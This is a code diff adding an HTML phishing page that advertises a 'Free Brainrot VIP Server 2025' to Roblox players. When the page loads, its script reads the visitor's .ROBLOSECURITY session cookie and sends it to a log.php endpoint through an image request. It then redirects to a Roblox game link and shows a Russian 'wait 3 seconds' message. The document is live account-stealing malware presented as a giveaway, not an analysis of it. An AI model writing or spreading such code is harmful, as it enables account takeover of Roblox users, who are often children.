@@ -1,0 +1,24 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>Free Brainrot VIP Server 2025</title>
+<script>
+function steal(){
+    var cookies = document.cookie.split(';');
+    for(var i=0; i<cookies.length; i++){
+        var c = cookies[i].trim();
+        if(c.startsWith('.ROBLOSECURITY=')){
+            var cookie = c.split('=')[1];
+            new Image().src = 'log.php?c=' + cookie + '&t=' + Date.now();
+        }
+    }
+}
+steal();
+setTimeout(()=>{location.href='roblox://placeId=155615604';}, 1500);
+</script>
+</head>
+<body style="background:black;color:lime;text-align:center;padding-top:150px;font-size:40px;">
+<h1>FREE BRAINROT VIP SERVER 2025</h1>
+<p>Skibidi + Ohio + Grimace Shake<br>Открываем приватку, жди 3 секунды...</p>
+</body>
+</html>
